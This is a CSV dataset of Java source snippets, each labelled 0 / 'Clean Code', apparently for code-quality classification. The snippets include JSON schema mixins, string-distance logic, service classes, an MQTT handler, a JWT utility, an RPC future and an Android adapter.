text,label,text_label
"/** 
 * The interface Sorted schema mixin 31.
 * @author bnasslashen
 */
@JsonPropertyOrder(value={""type"",""format"",""if"",""then"",""else""},alphabetic=true) public interface SortedSchemaMixin31 {
  /** 
 * Gets extensions.
 * @return the extensions
 */
  @JsonAnyGetter @JsonPropertyOrder(alphabetic=true) Map<String,Object> getExtensions();
  /** 
 * Gets json schema.
 * @return the json schema
 */
  @JsonIgnore Map<String,Object> getJsonSchema();
  /** 
 * Gets nullable.
 * @return the nullable
 */
  @JsonIgnore Boolean getNullable();
  /** 
 * Gets exclusive minimum.
 * @return the exclusive minimum
 */
  @JsonIgnore Boolean getExclusiveMinimum();
  /** 
 * Gets exclusive maximum.
 * @return the exclusive maximum
 */
  @JsonIgnore Boolean getExclusiveMaximum();
  /** 
 * Gets exclusive minimum value.
 * @return the exclusive minimum value
 */
  @JsonProperty(""exclusiveMinimum"") BigDecimal getExclusiveMinimumValue();
  /** 
 * Gets exclusive maximum value.
 * @return the exclusive maximum value
 */
  @JsonProperty(""exclusiveMaximum"") BigDecimal getExclusiveMaximumValue();
  /** 
 * Gets type.
 * @return the type
 */
  @JsonIgnore String getType();
  /** 
 * Gets types.
 * @return the types
 */
  @JsonProperty(""type"") @JsonSerialize(using=Schema31Mixin.TypeSerializer.class) Set<String> getTypes();
  /** 
 * Add extension.
 * @param name  the name
 * @param value the value
 */
  @JsonAnySetter void addExtension(  String name,  Object value);
  /** 
 * Gets example set flag.
 * @return the example set flag
 */
  @JsonIgnore boolean getExampleSetFlag();
  /** 
 * Gets example.
 * @return the example
 */
  @JsonInclude(value=JsonInclude.Include.NON_NULL) Object getExample();
  /** 
 * Gets json schema.
 * @return the json schema
 */
  @JsonIgnore Object getJsonSchemaImpl();
  /** 
 * Gets boolean schema value.
 * @return the boolean schema value
 */
  @JsonIgnore Boolean getBooleanSchemaValue();
}
",0,Clean Code
"/** 
 * Created by zhouyuan on 2019/4/26.
 */
public class LevenshteinDistanceLogic {
  public static float compareString(  String str,  String target){
    float d[][];
    int n=str.length();
    int m=target.length();
    int i;
    int j;
    char ch1;
    char ch2;
    float temp;
    if (n == 0) {
      return m;
    }
    if (m == 0) {
      return n;
    }
    d=new float[n + 1][m + 1];
    for (i=0; i <= n; i++) {
      d[i][0]=i;
    }
    for (j=0; j <= m; j++) {
      d[0][j]=j;
    }
    for (i=1; i <= n; i++) {
      ch1=str.charAt(i - 1);
      for (j=1; j <= m; j++) {
        ch2=target.charAt(j - 1);
        temp=compare(String.valueOf(ch1),String.valueOf(ch2));
        d[i][j]=min(d[i - 1][j] + 1,d[i][j - 1] + 1,d[i - 1][j - 1] + temp);
      }
    }
    return d[n][m];
  }
  private static float compare(  String input1,  String input2){
    for (    ENV e : similarList) {
      if (e.get_key().equalsIgnoreCase(String.format(""%s%s"",input1,input2)) || e.get_key().equalsIgnoreCase(String.format(""%s%s"",input2,input1))) {
        return Float.valueOf(e.get_value());
      }
    }
    if (input1.equalsIgnoreCase(input2))     return 0;
 else     return 1;
  }
  public static List<ENV> getSimilarList(){
    return similarList;
  }
  public static void setSimilarList(  List<ENV> similarList){
    LevenshteinDistanceLogic.similarList=similarList;
  }
  private static List<ENV> similarList=new ArrayList();
  public static void addSimilar(  ENV e){
    similarList.add(e);
  }
  private static float min(  float one,  float two,  float three){
    return (one=one < two ? one : two) < three ? one : three;
  }
}
",0,Clean Code
"/** 
 * 限时购商品关联管理Service Created by macro on 2018/11/16.
 */
public interface SmsFlashPromotionProductRelationService {
  /** 
 * 批量添加关联
 */
  @Transactional int create(  List<SmsFlashPromotionProductRelation> relationList);
  /** 
 * 修改关联相关信息
 */
  int update(  Long id,  SmsFlashPromotionProductRelation relation);
  /** 
 * 删除关联
 */
  int delete(  Long id);
  /** 
 * 获取关联详情
 */
  SmsFlashPromotionProductRelation getItem(  Long id);
  /** 
 * 分页查询相关商品及促销信息
 * @param flashPromotionId        限时购id
 * @param flashPromotionSessionId 限时购场次id
 */
  List<SmsFlashPromotionProduct> list(  Long flashPromotionId,  Long flashPromotionSessionId,  Integer pageSize,  Integer pageNum);
  /** 
 * 根据活动和场次id获取商品关系数量
 * @param flashPromotionId
 * @param flashPromotionSessionId
 * @return
 */
  long getCount(  Long flashPromotionId,  Long flashPromotionSessionId);
}
",0,Clean Code
"/** 
 * @author james mu
 * @date 2019/8/22 上午11:17
 */
public class GatewaySessionHandler {
  private static final String DEVICE_PROPERTY=""device"";
  private static final String DEFAULT_DEVICE_TYPE=""default"";
  public void onDeviceTelemetry(  MqttPublishMessage mqttMsg){
  }
  public void onDeviceConnect(  MqttPublishMessage msg) throws AdaptorException {
    JsonElement json=getJson(msg);
    String deviceName=checkDeviceName(getDeviceName(json));
    System.out.println(""onDeviceConnect: "" + deviceName);
  }
  public void onDeviceDisconnect(  MqttPublishMessage msg) throws AdaptorException {
    String deviceName=checkDeviceName(getDeviceName(getJson(msg)));
  }
  public void onDeviceAttributes(  MqttPublishMessage mqttMsg){
  }
  public void onDeviceAttributesRequest(  MqttPublishMessage msg){
  }
  public void onDeviceRpcResponse(  MqttPublishMessage mqttMsg){
  }
  private JsonElement getJson(  MqttPublishMessage mqttMsg) throws AdaptorException {
    return JsonMqttAdaptor.validateJsonPayload(mqttMsg.payload());
  }
  private String checkDeviceName(  String deviceName){
    if (StringUtils.isEmpty(deviceName)) {
      throw new RuntimeException(""Device name is empty!"");
    }
 else {
      return deviceName;
    }
  }
  private String getDeviceName(  JsonElement json) throws AdaptorException {
    return json.getAsJsonObject().get(DEVICE_PROPERTY).getAsString();
  }
}",0,Clean Code
"/** 
 * @author : leix.xie
 * @date : 2019/3/1 11:26
 */
public class IBytecodeProviderImpl implements IBytecodeProvider {
  @Override public byte[] getBytecode(  String externalPath,  String internalPath) throws IOException {
    int index=externalPath.indexOf(""jar!"");
    if (index >= 0) {
      final String jar;
      if (externalPath.startsWith(""jar"")) {
        jar=externalPath.substring(9,index + 3);
      }
 else {
        jar=externalPath.substring(5,index + 3);
      }
      final String file=externalPath.substring(index + 5);
      try (JarFile jarFile=new JarFile(jar)){
        ZipEntry entry=jarFile.getEntry(file);
        if (entry == null) {
          throw new IOException(""Entry not found: "" + internalPath);
        }
        return InterpreterUtil.getBytes(jarFile,entry);
      }
     }
    File file=new File(externalPath);
    if (internalPath == null) {
      return InterpreterUtil.getBytes(file);
    }
 else {
      try (ZipFile archive=new ZipFile(file)){
        ZipEntry entry=archive.getEntry(internalPath);
        if (entry == null)         throw new IOException(""Entry not found: "" + internalPath);
        return InterpreterUtil.getBytes(archive,entry);
      }
     }
  }
  private static boolean isJarFile(  URL resource){
    return ""jar"".equalsIgnoreCase(resource.getProtocol());
  }
}
",0,Clean Code
"/** 
 * 模板分组
 * @author PIG
 * @date 2023-02-21 20:01:53
 */
@Slf4j @Service @AllArgsConstructor public class GenGroupServiceImpl extends ServiceImpl<GenGroupMapper,GenGroupEntity> implements GenGroupService {
  private final GenTemplateGroupService genTemplateGroupService;
  /** 
 * 新增模板分组
 * @param genTemplateGroup
 */
  @Override public void saveGenGroup(  TemplateGroupDTO genTemplateGroup){
    GenGroupEntity groupEntity=new GenGroupEntity();
    BeanUtil.copyProperties(genTemplateGroup,groupEntity);
    baseMapper.insert(groupEntity);
    List<GenTemplateGroupEntity> goals=new LinkedList<>();
    for (    Long TemplateId : genTemplateGroup.getTemplateId()) {
      GenTemplateGroupEntity templateGroup=new GenTemplateGroupEntity();
      templateGroup.setTemplateId(TemplateId).setGroupId(groupEntity.getId());
      goals.add(templateGroup);
    }
    genTemplateGroupService.saveBatch(goals);
  }
  /** 
 * 按照ids删除
 * @param ids groupIds
 */
  @Override public void delGroupAndTemplate(  Long[] ids){
    this.removeBatchByIds(CollUtil.toList(ids));
    genTemplateGroupService.remove(Wrappers.<GenTemplateGroupEntity>lambdaQuery().in(GenTemplateGroupEntity::getGroupId,ids));
  }
  /** 
 * 按照id查询
 * @param id
 * @return
 */
  @Override public GroupVO getGroupVoById(  Long id){
    return baseMapper.getGroupVoById(id);
  }
  /** 
 * 根据id更新
 * @param groupVo
 */
  @Override public void updateGroupAndTemplateById(  GroupVO groupVo){
    GenGroupEntity groupEntity=new GenGroupEntity();
    BeanUtil.copyProperties(groupVo,groupEntity);
    this.updateById(groupEntity);
    genTemplateGroupService.remove(Wrappers.<GenTemplateGroupEntity>lambdaQuery().eq(GenTemplateGroupEntity::getGroupId,groupVo.getId()));
    List<GenTemplateGroupEntity> goals=new LinkedList<>();
    for (    Long templateId : groupVo.getTemplateId()) {
      goals.add(new GenTemplateGroupEntity().setGroupId(groupVo.getId()).setTemplateId(templateId));
    }
    genTemplateGroupService.saveBatch(goals);
  }
}
",0,Clean Code
"public class PopMenuAdapter extends BaseAdapter {
  private List<PopMenuAction> dataSource=new ArrayList<>();
  public PopMenuAdapter(){
  }
  public void setDataSource(  final List datas){
    dataSource=datas;
    ThreadUtils.postOnUiThread(new Runnable(){
      @Override public void run(){
        notifyDataSetChanged();
      }
    }
);
  }
  @Override public int getCount(){
    return dataSource.size();
  }
  @Override public Object getItem(  int position){
    return dataSource.get(position);
  }
  @Override public long getItemId(  int position){
    return position;
  }
  @Override public View getView(  final int position,  View convertView,  ViewGroup parent){
    ViewHolder holder;
    if (convertView == null) {
      convertView=LayoutInflater.from(TUIConfig.getAppContext()).inflate(R.layout.pop_menu_adapter,parent,false);
      holder=new ViewHolder();
      holder.menuIcon=convertView.findViewById(R.id.pop_menu_icon);
      int iconSize=convertView.getResources().getDimensionPixelSize(R.dimen.core_pop_menu_icon_size);
      ViewGroup.LayoutParams params=holder.menuIcon.getLayoutParams();
      params.width=iconSize;
      params.height=iconSize;
      holder.menuIcon.setLayoutParams(params);
      holder.menuLable=convertView.findViewById(R.id.pop_menu_label);
      convertView.setTag(holder);
    }
 else {
      holder=(ViewHolder)convertView.getTag();
    }
    PopMenuAction action=(PopMenuAction)getItem(position);
    holder.menuIcon.setVisibility(View.VISIBLE);
    if (action.getIcon() != null) {
      holder.menuIcon.setImageBitmap(action.getIcon());
    }
 else     if (action.getIconResId() > 0) {
      holder.menuIcon.setImageResource(action.getIconResId());
    }
 else {
      holder.menuIcon.setVisibility(View.GONE);
    }
    holder.menuLable.setText(action.getActionName());
    return convertView;
  }
static class ViewHolder {
    TextView menuLable;
    ImageView menuIcon;
  }
}
",0,Clean Code
"@JsonTypeInfo(use=JsonTypeInfo.Id.NAME,include=JsonTypeInfo.As.EXISTING_PROPERTY,property=""type"",visible=true) @JsonSubTypes({@JsonSubTypes.Type(value=ConcreteObjectA.class,name=""Type A"")}) public abstract class AbstractObject {
  private final ConcreteType type;
  private final String name;
  protected AbstractObject(  ConcreteType type,  String name){
    this.type=type;
    this.name=name;
  }
  public ConcreteType getType(){
    return type;
  }
  public String getName(){
    return name;
  }
}
/** 
 * The type Abstract object.
 */
@JsonTypeInfo(use=JsonTypeInfo.Id.NAME,include=JsonTypeInfo.As.EXISTING_PROPERTY,property=""type"",visible=true) @JsonSubTypes({@JsonSubTypes.Type(value=ConcreteObjectA.class,name=""Type A"")}) public abstract class AbstractObject {
  /** 
 * The Type.
 */
  private final ConcreteType type;
  /** 
 * The Name.
 */
  private final String name;
  /** 
 * Instantiates a new Abstract object.
 * @param type the type 
 * @param name the name
 */
  protected AbstractObject(  ConcreteType type,  String name){
    this.type=type;
    this.name=name;
  }
  /** 
 * Gets type.
 * @return the type
 */
  public ConcreteType getType(){
    return type;
  }
  /** 
 * Gets name.
 * @return the name
 */
  public String getName(){
    return name;
  }
}
",0,Clean Code
"final class MapIterator implements Iterator<Map.Entry<K,V>>, Map.Entry<K,V> {
  int mEnd;
  int mIndex;
  boolean mEntryValid=false;
  MapIterator(){
    mEnd=colGetSize() - 1;
    mIndex=-1;
  }
  @Override public boolean hasNext(){
    return mIndex < mEnd;
  }
  @Override public Map.Entry<K,V> next(){
    if (!hasNext())     throw new NoSuchElementException();
    mIndex++;
    mEntryValid=true;
    return this;
  }
  @Override public void remove(){
    if (!mEntryValid) {
      throw new IllegalStateException();
    }
    colRemoveAt(mIndex);
    mIndex--;
    mEnd--;
    mEntryValid=false;
  }
  @Override public K getKey(){
    if (!mEntryValid) {
      throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");
    }
    return (K)colGetEntry(mIndex,0);
  }
  @Override public V getValue(){
    if (!mEntryValid) {
      throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");
    }
    return (V)colGetEntry(mIndex,1);
  }
  @Override public V setValue(  V object){
    if (!mEntryValid) {
      throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");
    }
    return colSetValue(mIndex,object);
  }
  @Override public boolean equals(  Object o){
    if (!mEntryValid) {
      throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");
    }
    if (!(o instanceof Map.Entry)) {
      return false;
    }
    Map.Entry<?,?> e=(Map.Entry<?,?>)o;
    return ContainerHelpers.equal(e.getKey(),colGetEntry(mIndex,0)) && ContainerHelpers.equal(e.getValue(),colGetEntry(mIndex,1));
  }
  @Override public int hashCode(){
    if (!mEntryValid) {
      throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");
    }
    final Object key=colGetEntry(mIndex,0);
    final Object value=colGetEntry(mIndex,1);
    return (key == null ? 0 : key.hashCode()) ^ (value == null ? 0 : value.hashCode());
  }
  @Override public String toString(){
    return getKey() + ""="" + getValue();
  }
}
",0,Clean Code
"/** 
 * Created by heavyrainlee on 20/12/2017.
 */
@ContentTag(type=ContentType_CREATE_GROUP,flag=PersistFlag.Persist) public class CreateGroupNotificationContent extends GroupNotificationMessageContent {
  public String creator;
  public String groupName;
  public CreateGroupNotificationContent(){
  }
  @Override public String formatNotification(  Message message){
    StringBuilder sb=new StringBuilder();
    if (fromSelf) {
      sb.append(""您创建了群组 "");
    }
 else {
      sb.append(ChatManager.Instance().getUserDisplayName(creator));
      sb.append(""创建了群组 "");
    }
    sb.append(groupName);
    return sb.toString();
  }
  @Override public MessagePayload encode(){
    MessagePayload payload=super.encode();
    try {
      JSONObject objWrite=new JSONObject();
      objWrite.put(""g"",groupId);
      objWrite.put(""o"",creator);
      objWrite.put(""n"",groupName);
      payload.binaryContent=objWrite.toString().getBytes();
    }
 catch (    JSONException e) {
      e.printStackTrace();
    }
    return payload;
  }
  @Override public void decode(  MessagePayload payload){
    super.decode(payload);
    try {
      if (payload.binaryContent != null) {
        JSONObject jsonObject=new JSONObject(new String(payload.binaryContent));
        groupId=jsonObject.optString(""g"");
        creator=jsonObject.optString(""o"");
        groupName=jsonObject.optString(""n"");
      }
    }
 catch (    JSONException e) {
      e.printStackTrace();
    }
  }
  @Override public int describeContents(){
    return 0;
  }
  @Override public void writeToParcel(  Parcel dest,  int flags){
    super.writeToParcel(dest,flags);
    dest.writeString(this.creator);
    dest.writeString(this.groupName);
  }
  protected CreateGroupNotificationContent(  Parcel in){
    super(in);
    this.creator=in.readString();
    this.groupName=in.readString();
  }
  public static final Creator<CreateGroupNotificationContent> CREATOR=new Creator<CreateGroupNotificationContent>(){
    @Override public CreateGroupNotificationContent createFromParcel(    Parcel source){
      return new CreateGroupNotificationContent(source);
    }
    @Override public CreateGroupNotificationContent[] newArray(    int size){
      return new CreateGroupNotificationContent[size];
    }
  }
;
}
",0,Clean Code
"@EnvTest public class ChunkHeightmapIntegrationTest {
  @Test public void testChunkHeightmap(  Env env){
    var instance=env.createFlatInstance();
    instance.loadChunk(0,0).join();
    var chunk=instance.getChunk(0,0);
    var heightmap=chunk.motionBlockingHeightmap().getHeight(0,0);
    assertEquals(heightmap,39);
  }
  @Test public void heightMapPlaceTest(  Env env){
    var instance=env.createFlatInstance();
    instance.loadChunk(0,0).join();
    var chunk=instance.getChunk(0,0);
{
      instance.setBlock(0,40,0,Block.STONE);
      var heightmap=chunk.motionBlockingHeightmap().getHeight(0,0);
      assertEquals(heightmap,40);
    }
{
      instance.setBlock(0,45,0,Block.STONE);
      var heightmap=chunk.motionBlockingHeightmap().getHeight(0,0);
      assertEquals(heightmap,45);
    }
  }
  @Test public void heightMapRemoveTest(  Env env){
    var instance=env.createFlatInstance();
    instance.loadChunk(0,0).join();
    var chunk=instance.getChunk(0,0);
{
      instance.setBlock(0,45,0,Block.STONE);
      var heightmap=chunk.motionBlockingHeightmap().getHeight(0,0);
      assertEquals(heightmap,45);
    }
{
      instance.setBlock(0,45,0,Block.AIR);
      var heightmap=chunk.motionBlockingHeightmap().getHeight(0,0);
      assertEquals(heightmap,39);
    }
  }
}
",0,Clean Code
"@FunctionEntry public class DisablePokeEffect extends CommonDelayableHook {
  public static final DisablePokeEffect INSTANCE=new DisablePokeEffect();
  public DisablePokeEffect(){
    super(""rq_disable_poke_effect"");
  }
  @Override public boolean initOnce(){
    try {
      for (      Method m : Initiator._GivingHeartItemBuilder().getDeclaredMethods()) {
        Class<?>[] argt=m.getParameterTypes();
        if (m.getName().equals(""a"") && argt.length == 3 && !Modifier.isStatic(m.getModifiers())) {
          XposedBridge.hookMethod(m,new XC_MethodHook(){
            @Override protected void beforeHookedMethod(            MethodHookParam param) throws Throwable {
              if (LicenseStatus.sDisableCommonHooks) {
                return;
              }
              if (!isEnabled()) {
                return;
              }
              if (param.getResult().getClass().isPrimitive()) {
                param.setResult(false);
              }
            }
          }
);
        }
      }
      return true;
    }
 catch (    Throwable e) {
      return false;
    }
  }
}
",0,Clean Code
"/** 
 * @author james mu
 * @date 2020/9/7 19:12
 */
@Component public class JwtTokenUtil implements Serializable {
  private static final long serialVersionUID=-2550185165626007488L;
  public static final long JWT_TOKEN_VALIDITY=5 * 60 * 60;
  @Value(""${jwt.secret}"") private String secret;
  public String getUsernameFromToken(  String token){
    return getClaimFromToken(token,Claims::getSubject);
  }
  public Date getIssuedAtDateFromToken(  String token){
    return getClaimFromToken(token,Claims::getIssuedAt);
  }
  public Date getExpirationDateFromToken(  String token){
    return getClaimFromToken(token,Claims::getExpiration);
  }
  public <T>T getClaimFromToken(  String token,  Function<Claims,T> claimsResolver){
    final Claims claims=getAllClaimsFromToken(token);
    return claimsResolver.apply(claims);
  }
  private Claims getAllClaimsFromToken(  String token){
    return Jwts.parser().setSigningKey(secret).parseClaimsJws(token).getBody();
  }
  private Boolean isTokenExpired(  String token){
    final Date expiration=getExpirationDateFromToken(token);
    return expiration.before(new Date());
  }
  private Boolean ignoreTokenExpiration(  String token){
    return false;
  }
  public String generateToken(  UserDetails userDetails){
    Map<String,Object> claims=new HashMap<>();
    return doGenerateToken(claims,userDetails.getUsername());
  }
  private String doGenerateToken(  Map<String,Object> claims,  String subject){
    return Jwts.builder().setClaims(claims).setSubject(subject).setIssuedAt(new Date(System.currentTimeMillis())).setExpiration(new Date(System.currentTimeMillis() + JWT_TOKEN_VALIDITY * 1000)).signWith(SignatureAlgorithm.HS512,secret).compact();
  }
  public Boolean canTokenBeRefreshed(  String token){
    return (!isTokenExpired(token) || ignoreTokenExpiration(token));
  }
  public Boolean validateToken(  String token,  UserDetails userDetails){
    final String username=getUsernameFromToken(token);
    return (username.equals(userDetails.getUsername()) && !isTokenExpired(token));
  }
}",0,Clean Code
"/** 
 * @author AllDataDC
 * @date 2023/3/26 11:14
 * @Description :
 */
public class XxlRpcInvokeFuture implements Future {
  private XxlRpcFutureResponse futureResponse;
  public XxlRpcInvokeFuture(  XxlRpcFutureResponse futureResponse){
    this.futureResponse=futureResponse;
  }
  public void stop(){
    futureResponse.removeInvokerFuture();
  }
  @Override public boolean cancel(  boolean mayInterruptIfRunning){
    return futureResponse.cancel(mayInterruptIfRunning);
  }
  @Override public boolean isCancelled(){
    return futureResponse.isCancelled();
  }
  @Override public boolean isDone(){
    return futureResponse.isDone();
  }
  @Override public Object get() throws ExecutionException, InterruptedException {
    try {
      return get(-1,TimeUnit.MILLISECONDS);
    }
 catch (    TimeoutException e) {
      throw new XxlRpcException(e);
    }
  }
  @Override public Object get(  long timeout,  TimeUnit unit) throws InterruptedException, ExecutionException, TimeoutException {
    try {
      XxlRpcResponse xxlRpcResponse=futureResponse.get(timeout,unit);
      if (xxlRpcResponse.getErrorMsg() != null) {
        throw new XxlRpcException(xxlRpcResponse.getErrorMsg());
      }
      return xxlRpcResponse.getResult();
    }
  finally {
      stop();
    }
  }
  private static ThreadLocal<XxlRpcInvokeFuture> threadInvokerFuture=new ThreadLocal<XxlRpcInvokeFuture>();
  /** 
 * get future
 * @param type
 * @param < T >
 * @return
 */
  public static <T>Future<T> getFuture(  Class<T> type){
    Future<T> future=(Future<T>)threadInvokerFuture.get();
    threadInvokerFuture.remove();
    return future;
  }
  /** 
 * set future
 * @param future
 */
  public static void setFuture(  XxlRpcInvokeFuture future){
    threadInvokerFuture.set(future);
  }
  /** 
 * remove future
 */
  public static void removeFuture(){
    threadInvokerFuture.remove();
  }
}",0,Clean Code
"/** 
 * BPM 消息 Service 实现类
 * @author 芋道源码
 */
@Service @Validated @Slf4j public class BpmMessageServiceImpl implements BpmMessageService {
  @Resource private SmsSendApi smsSendApi;
  @Resource private WebProperties webProperties;
  @Override public void sendMessageWhenProcessInstanceApprove(  BpmMessageSendWhenProcessInstanceApproveReqDTO reqDTO){
    Map<String,Object> templateParams=new HashMap<>();
    templateParams.put(""processInstanceName"",reqDTO.getProcessInstanceName());
    templateParams.put(""detailUrl"",getProcessInstanceDetailUrl(reqDTO.getProcessInstanceId()));
    smsSendApi.sendSingleSmsToAdmin(BpmMessageConvert.INSTANCE.convert(reqDTO.getStartUserId(),BpmMessageEnum.PROCESS_INSTANCE_APPROVE.getSmsTemplateCode(),templateParams)).checkError();
  }
  @Override public void sendMessageWhenProcessInstanceReject(  BpmMessageSendWhenProcessInstanceRejectReqDTO reqDTO){
    Map<String,Object> templateParams=new HashMap<>();
    templateParams.put(""processInstanceName"",reqDTO.getProcessInstanceName());
    templateParams.put(""reason"",reqDTO.getReason());
    templateParams.put(""detailUrl"",getProcessInstanceDetailUrl(reqDTO.getProcessInstanceId()));
    smsSendApi.sendSingleSmsToAdmin(BpmMessageConvert.INSTANCE.convert(reqDTO.getStartUserId(),BpmMessageEnum.PROCESS_INSTANCE_REJECT.getSmsTemplateCode(),templateParams)).checkError();
  }
  @Override public void sendMessageWhenTaskAssigned(  BpmMessageSendWhenTaskCreatedReqDTO reqDTO){
    Map<String,Object> templateParams=new HashMap<>();
    templateParams.put(""processInstanceName"",reqDTO.getProcessInstanceName());
    templateParams.put(""taskName"",reqDTO.getTaskName());
    templateParams.put(""startUserNickname"",reqDTO.getStartUserNickname());
    templateParams.put(""detailUrl"",getProcessInstanceDetailUrl(reqDTO.getProcessInstanceId()));
    smsSendApi.sendSingleSmsToAdmin(BpmMessageConvert.INSTANCE.convert(reqDTO.getAssigneeUserId(),BpmMessageEnum.TASK_ASSIGNED.getSmsTemplateCode(),templateParams)).checkError();
  }
  @Override public void sendMessageWhenTaskTimeout(  BpmMessageSendWhenTaskTimeoutReqDTO reqDTO){
    Map<String,Object> templateParams=new HashMap<>();
    templateParams.put(""processInstanceName"",reqDTO.getProcessInstanceName());
    templateParams.put(""taskName"",reqDTO.getTaskName());
    templateParams.put(""detailUrl"",getProcessInstanceDetailUrl(reqDTO.getProcessInstanceId()));
    smsSendApi.sendSingleSmsToAdmin(BpmMessageConvert.INSTANCE.convert(reqDTO.getAssigneeUserId(),BpmMessageEnum.TASK_TIMEOUT.getSmsTemplateCode(),templateParams)).checkError();
  }
  private String getProcessInstanceDetailUrl(  String taskId){
    return webProperties.getAdminUi().getUrl() + ""/bpm/process-instance/detail?id="" + taskId;
  }
}
",0,Clean Code
"/** 
 * @author xuxueli 2018-10-22 18:31:42
 */
public class XxlRpcInvokeFuture implements Future {
  private XxlRpcFutureResponse futureResponse;
  public XxlRpcInvokeFuture(  XxlRpcFutureResponse futureResponse){
    this.futureResponse=futureResponse;
  }
  public void stop(){
    futureResponse.removeInvokerFuture();
  }
  @Override public boolean cancel(  boolean mayInterruptIfRunning){
    return futureResponse.cancel(mayInterruptIfRunning);
  }
  @Override public boolean isCancelled(){
    return futureResponse.isCancelled();
  }
  @Override public boolean isDone(){
    return futureResponse.isDone();
  }
  @Override public Object get() throws ExecutionException, InterruptedException {
    try {
      return get(-1,TimeUnit.MILLISECONDS);
    }
 catch (    TimeoutException e) {
      throw new XxlRpcException(e);
    }
  }
  @Override public Object get(  long timeout,  TimeUnit unit) throws InterruptedException, ExecutionException, TimeoutException {
    try {
      XxlRpcResponse xxlRpcResponse=futureResponse.get(timeout,unit);
      if (xxlRpcResponse.getErrorMsg() != null) {
        throw new XxlRpcException(xxlRpcResponse.getErrorMsg());
      }
      return xxlRpcResponse.getResult();
    }
  finally {
      stop();
    }
  }
  private static ThreadLocal<XxlRpcInvokeFuture> threadInvokerFuture=new ThreadLocal<XxlRpcInvokeFuture>();
  /** 
 * get future
 * @param type
 * @param < T >
 * @return
 */
  public static <T>Future<T> getFuture(  Class<T> type){
    Future<T> future=(Future<T>)threadInvokerFuture.get();
    threadInvokerFuture.remove();
    return future;
  }
  /** 
 * set future
 * @param future
 */
  public static void setFuture(  XxlRpcInvokeFuture future){
    threadInvokerFuture.set(future);
  }
  /** 
 * remove future
 */
  public static void removeFuture(){
    threadInvokerFuture.remove();
  }
}
",0,Clean Code
"public interface SetGroupManagerRequestOrBuilder extends com.google.protobuf.MessageOrBuilder {
  /** 
 * <code>required string group_id = 1;</code>
 */
  boolean hasGroupId();
  /** 
 * <code>required string group_id = 1;</code>
 */
  java.lang.String getGroupId();
  /** 
 * <code>required string group_id = 1;</code>
 */
  com.google.protobuf.ByteString getGroupIdBytes();
  /** 
 * <code>required int32 type = 2;</code>
 */
  boolean hasType();
  /** 
 * <code>required int32 type = 2;</code>
 */
  int getType();
  /** 
 * <code>repeated string user_id = 3;</code>
 */
  java.util.List<java.lang.String> getUserIdList();
  /** 
 * <code>repeated string user_id = 3;</code>
 */
  int getUserIdCount();
  /** 
 * <code>repeated string user_id = 3;</code>
 */
  java.lang.String getUserId(  int index);
  /** 
 * <code>repeated string user_id = 3;</code>
 */
  com.google.protobuf.ByteString getUserIdBytes(  int index);
  /** 
 * <code>repeated int32 to_line = 4;</code>
 */
  java.util.List<java.lang.Integer> getToLineList();
  /** 
 * <code>repeated int32 to_line = 4;</code>
 */
  int getToLineCount();
  /** 
 * <code>repeated int32 to_line = 4;</code>
 */
  int getToLine(  int index);
  /** 
 * <code>optional .MessageContent notify_content = 5;</code>
 */
  boolean hasNotifyContent();
  /** 
 * <code>optional .MessageContent notify_content = 5;</code>
 */
  cn.wildfirechat.proto.WFCMessage.MessageContent getNotifyContent();
  /** 
 * <code>optional .MessageContent notify_content = 5;</code>
 */
  cn.wildfirechat.proto.WFCMessage.MessageContentOrBuilder getNotifyContentOrBuilder();
}
",0,Clean Code
